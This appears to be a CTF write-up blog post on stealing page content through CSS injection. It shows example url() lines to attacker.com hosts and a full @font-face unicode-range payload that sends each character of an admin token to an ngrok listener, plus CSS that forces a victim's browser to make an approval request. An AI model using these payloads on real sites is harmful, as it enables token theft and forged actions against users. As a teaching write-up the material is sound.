---
layout: post
title:  "[Web Exploitation] Exfiltration via CSS Injection"
date:   2024-07-24
categories: webex
description: Did you know? you can exfiltrate data using CSS!  
tags: webex ctf css htb frontend
---

# Background

I was working on a web exploitation challenge where the goal was to steal web content using only CSS code. I had a lot of fun with it, and I'm quite sure this vulnerability can be found in real-world scenarios. The main challenge is sorting the data, as the exploitation sends the results in a random sequence.

# Attack Scenario

<img src="/images/cssinjek/dia.jpg"/>

If you look at the image above, you'll see that this attack is triggered when the victim accesses the page and our malicious CSS is rendered.

# Root Cause

As long as we are able to control the CSS code, the site should be vulnerable. Below is an example of code where we create a new CSS file, which will be used on a page.

{% highlight html %}
<link href="/assets/css/bootstrap.min.css" rel="stylesheet" />
<link href="/assets/css/main.css" rel="stylesheet" />
<link href="<cssFile>" rel="stylesheet" />
{% endhighlight %}

The CSP is set, but it allow us to use font-src 

{% highlight js %}
"default-src 'self'; object-src 'none'; img-src 'self'; style-src 'self'; font-src 'self' *;"
{% endhighlight %}

Our goal is to steal the token from the admin page. Below is the HTML code where the token will be reflected.

{% highlight html %}
<div class="form-group">
<p id="approvalToken" class="d-none"> <approvalToken> </p>
{% endhighlight %}

Since the admin will always visit the page where we can control the CSS, our CSS will be rendered in the admin's browser.

# Exploitation

I setup a simple HTTP listener 

    php -S localhost:8080

Then, I set up an ngrok proxy forwarder so my machine can be accessed publicly.

    ngrok tcp 8080

There are a couple of different ways to steal web content using only CSS. If the secret content is located in an `<input>` element, you can use the CSS code below.

{% highlight css %}
input[name=csrf][value^=a]{
    background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
    background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
    background-image: url(https://attacker.com/exfil/9);   
}
{% endhighlight %}

Since there's CSP in configured, So we can use `@font-face` and check if the unicode is in a specific range. For example.

{% highlight html %}
<style>
@font-face{
    font-family:poc;
    src: url(http://attacker.example.com/?A); /* fetched */
    unicode-range:U+0041;
}
@font-face{
    font-family:poc;
    src: url(http://attacker.example.com/?B); /* fetched too */
    unicode-range:U+0042;
}
@font-face{
    font-family:poc;
    src: url(http://attacker.example.com/?C); /* not fetched */
    unicode-range:U+0043;
}
#sensitive-information{
    font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
{% endhighlight %} 

Since the sensitive information is under `#sensitive-information` and we can control the CSS code, we can use `unicode-range` to check if specific ASCII codes are present in `#sensitive-information`. Based on the example above, the victim's browser will make requests to `http://attacker.example.com/?A` and `http://attacker.example.com/?B`.

We can specify all the character codes A-Z, a-z, and 0-9 using `@font-face`. This way, the victim's browser will check for every ASCII code and make a request to `http://attacker.example.com` for each character.

{% highlight CSS %}

@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:A');
	unicode-range:U+0041;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:B');
	unicode-range:U+0042;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:C');
	unicode-range:U+0043;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:D');
	unicode-range:U+0044;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:E');
	unicode-range:U+0045;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:F');
	unicode-range:U+0046;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:G');
	unicode-range:U+0047;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:H');
	unicode-range:U+0048;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:I');
	unicode-range:U+0049;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:J');
	unicode-range:U+004A;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:K');
	unicode-range:U+004B;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:L');
	unicode-range:U+004C;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:M');
	unicode-range:U+004D;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:N');
	unicode-range:U+004E;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:O');
	unicode-range:U+004F;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:P');
	unicode-range:U+0050;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:Q');
	unicode-range:U+0051;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:R');
	unicode-range:U+0052;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:S');
	unicode-range:U+0053;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:T');
	unicode-range:U+0054;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:U');
	unicode-range:U+0055;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:V');
	unicode-range:U+0056;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:W');
	unicode-range:U+0057;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:X');
	unicode-range:U+0058;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:Y');
	unicode-range:U+0059;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:Z');
	unicode-range:U+005A;
}

@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:a');
	unicode-range:U+0061;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:b');
	unicode-range:U+0062;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:c');
	unicode-range:U+0063;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:d');
	unicode-range:U+0064;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:e');
	unicode-range:U+0065;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:f');
	unicode-range:U+0066;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:g');
	unicode-range:U+0067;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:h');
	unicode-range:U+0068;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:i');
	unicode-range:U+0069;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:j');
	unicode-range:U+006A;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:k');
	unicode-range:U+006B;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:l');
	unicode-range:U+006C;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:m');
	unicode-range:U+006D;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:n');
	unicode-range:U+006E;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:o');
	unicode-range:U+006F;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:p');
	unicode-range:U+0070;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:q');
	unicode-range:U+0071;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:r');
	unicode-range:U+0072;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:s');
	unicode-range:U+0073;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:t');
	unicode-range:U+0074;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:u');
	unicode-range:U+0075;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:v');
	unicode-range:U+0076;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:w');
	unicode-range:U+0077;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:x');
	unicode-range:U+0078;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:y');
	unicode-range:U+0079;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:z');
	unicode-range:U+007A;
}

@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:0');
	unicode-range:U+0030;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:1');
	unicode-range:U+0031;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:2');
	unicode-range:U+0032;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:3');
	unicode-range:U+0033;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:4');
	unicode-range:U+0034;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:5');
	unicode-range:U+0035;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:6');
	unicode-range:U+0036;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:7');
	unicode-range:U+0037;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:8');
	unicode-range:U+0038;
}
@font-face{
	font-family:attack;
	src:url('http://0.tcp.ap.ngrok.io:19373//?Found:9');
	unicode-range:U+0039;
}
.form-group #approvalToken{
    font-size: 10px;
    display: inline;
    z-index: 10000;
    font-family:attack;
}

{% endhighlight %}

Not only to steal sensitive information, but it can also be exploited to make HTTP requests using the victim's session or cookies. For example, if there's a GET URL, an attacker can use the following CSS code to make an HTTP GET request:

{% highlight css %}
@font-face {
    font-family: trigger;
    src: url('http://127.0.0.1:1337/approve/1/03456DFGHILOQSVWZcefgijlnopqsuvw');
    unicode-range:U+0043;
}

.form-group #approvalToken{
    font-size: 10px;
    font-family:trigger;
}
{% endhighlight %}

Here’s what happens in the background on the victim’s browser:

<img src="/images/cssinjek/netools.png">

The attacker’s listener will obtain all the information, but in a random sequence.

<img src="/images/cssinjek/ngrok.png">

Our next challenge is to sort the exfiltrated ASCII characters. Since this is a CTF challenge, they have already provided the logic for sorting the token, which makes it easier. However, in real-world scenarios, it would require more effort to find the correct valid token.

P.S.: This technique can only be used if the token does not contain duplicate ASCII characters.

# Outro

Now I’ve unlocked a new fear: What if someone uses this trick on free web templates? 😅